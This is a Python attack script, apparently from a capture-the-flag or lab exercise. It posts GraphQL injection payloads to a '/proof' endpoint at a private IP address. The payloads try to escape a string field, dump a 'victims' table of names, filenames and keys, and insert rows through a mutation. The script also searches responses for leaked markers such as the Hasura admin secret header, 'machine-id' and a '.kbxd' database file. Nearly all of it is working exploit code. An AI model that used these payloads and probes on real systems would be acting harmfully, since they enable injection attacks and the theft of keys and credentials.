import json
import re
import urllib.error
import urllib.request

TARGET = "http://10.113.161.234/proof"

PAYLOADS = [
    'A' * 42,
    '"',
    '\\"',
    'x"y',
    'x\\"y',
    'x\nquery{victims{id name filename key}}\n',
    'x"}){affected_rows} query{victims{id name filename key}}#',
    'x"} query{victims{id name filename key}} #',
    'x\\"}){affected_rows} query{victims{id name filename key}}#',
    'x"} mutation {insert_victims(objects:{name:"a",filename:"b",key:"c"}){affected_rows}} #',
]


def post(proof: str, size: int = 7000):
    req = urllib.request.Request(TARGET, method="POST")
    req.add_header("Content-Type", "application/json")
    data = json.dumps({"size": size, "proof": proof}).encode()
    try:
        with urllib.request.urlopen(req, data=data, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def summarize(text: str) -> str:
    needles = [
        "errors",
        "GraphQL",
        "victims",
        "Database.kbxd",
        "x-hasura-admin-secret",
        "affected_rows",
        "locale.alias",
        "machine-id",
    ]
    out = []
    for n in needles:
        if n in text:
            i = text.find(n)
            out.append(f"{n}: ...{text[max(0, i-60):i+120]!r}")
    return "\n".join(out) if out else "(no obvious markers)"


for i, p in enumerate(PAYLOADS, 1):
    status, body = post(p)
    print(f"\n=== payload #{i} status={status} len={len(body)} ===")
    print("proof repr:", repr(p))
    print("head:", repr(body[:120]))
    print("markers:\n", summarize(body))
